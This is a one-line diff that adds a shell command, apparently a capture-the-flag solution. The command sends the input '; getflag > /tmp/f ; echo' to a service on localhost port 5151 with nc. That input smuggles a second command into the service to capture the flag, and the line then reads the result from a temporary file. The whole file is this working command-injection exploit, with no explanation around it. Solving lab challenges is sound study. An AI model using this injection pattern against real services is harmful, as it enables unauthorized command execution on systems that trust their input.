@@ -1,0 +1,1 @@
+echo '; getflag > /tmp/f ; echo' | nc localhost 5151 && cat /tmp/f
